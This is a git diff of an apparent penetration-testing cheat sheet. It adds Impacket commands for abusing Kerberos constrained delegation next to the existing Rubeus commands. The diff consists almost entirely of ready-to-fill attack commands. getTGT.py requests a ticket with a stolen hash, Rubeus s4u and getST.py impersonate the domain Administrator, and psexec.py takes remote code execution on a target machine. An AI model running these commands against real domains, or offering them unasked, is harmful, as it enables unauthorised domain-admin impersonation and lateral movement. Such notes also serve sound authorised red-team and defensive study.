@@ -303,7 +303,8 @@ then inject the tgt:
 ```
   
 # Contrained delegation
-asktgt with the server/user with contrained delegation:
+### with rubeus
+asktgt for the server/user with contrained delegation:
 ```
 .\Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<user> /ptt
 ```
@@ -311,7 +312,19 @@ asktgs with previous tgt and impersonate domain admin:
 ```
 .\Rubeus.exe s4u /domain:<domain> /impersonateuser:Administrator /msdsspn:"<service>" /ticket:<TGT> /ptt
 ```
-ps: the same can be done with impacket script
+### with impacket 
+asktgt for the server/user with contrained delegation:
+```
+getTGT.py -hashes :<hash> <domain>/<user-with-contrainedDELEG> -dc-ip <ip>
+```
+asktgs with previous tgt and impersonate domain admin:
+```
+getST.py -k -no-pass -dc-ip <ip> -spn <service> -impersonate Administrator <domain>/<user>
+```
+for example, we could psexec if delegate for cifs:
+```
+psexec.py <domain>/<user-impersonate>@<FQDN-TargetMachine> -k -no-pass -target-ip <ip> -dc-ip <ip>
+```
 --------------------------------------------------------------
 
 # Check LIST
